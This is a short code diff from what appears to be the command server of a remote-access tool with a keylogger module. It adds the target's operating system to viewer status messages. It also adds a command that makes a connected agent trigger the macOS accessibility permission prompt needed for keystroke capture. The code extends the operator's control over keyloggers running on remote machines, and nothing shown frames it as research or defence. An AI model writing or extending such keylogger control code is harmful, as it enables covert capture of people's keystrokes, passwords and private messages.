@@ -447,7 +447,7 @@ export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
   sessionManager.addKeyloggerSession(session);
   ws.data.sessionId = sessionId;
   logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
-  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
+  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientOs: target?.os || "" });
   if (!target) {
     safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
   }
@@ -465,6 +465,12 @@ export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, ra
 
   const commandId = uuidv4();
   switch (payload.type) {
+    case "keylog_request_permission":
+      // Ask the agent to trigger the macOS accessibility permission prompt.
+      // On non-macOS agents this is a no-op that immediately returns granted.
+      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_request_permission", id: commandId } as any));
+      metrics.recordCommand("keylog_request_permission");
+      break;
     case "keylog_list":
       target.ws.send(encodeMessage({ type: "command", commandType: "keylog_list", id: commandId } as any));
       metrics.recordCommand("keylog_list");
